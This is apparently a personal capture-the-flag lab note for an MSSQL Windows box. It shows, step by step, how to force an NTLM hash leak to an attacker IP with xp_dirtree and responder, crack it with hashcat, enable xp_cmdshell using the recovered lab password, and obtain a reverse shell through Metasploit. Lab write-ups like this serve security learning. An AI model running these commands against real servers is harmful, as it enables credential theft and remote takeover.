**==Now that we know the `mssql`service is running as `mssql-svc`user, we can try to capture hash using `responder`==**

# Capturing and Cracking Hash
---
- Start responder
	- `sudo responder -I tun0`
- **Access our attacker IP** on the `mssql`server:
	- `exec xp_dirtree '\\10.10.14.22\something'
	- ![[Pasted image 20250422155515.png]]
- ![[Pasted image 20250422155535.png]]
- Let's crack using `hashcat`:
	- ![[Pasted image 20250422155612.png]]
- `mssql-svc`: `corporate568`

# Logging in and RCE
---
- This user has `xp_cmdshell`permission while using `impacket-mssqlclient`:
	- `Impacket-mssqlclient QUERIER/MSSQL-SVC:'corporate568'@10.10.10.125 -windows-auth`
	- `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`
	- `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
	- `EXEC xp_cmdshell 'whoami';`
	- ![[Pasted image 20250422155726.png]]

# Getting reverse shell
---
- Using `web-delivery`, any of the d**irect meterpreter shells did not work because of the AV**
- But using `windows/x64/shell/reverse_tcp`worked:
	- ![[Pasted image 20250422155935.png]]
	- ![[Pasted image 20250422160059.png]]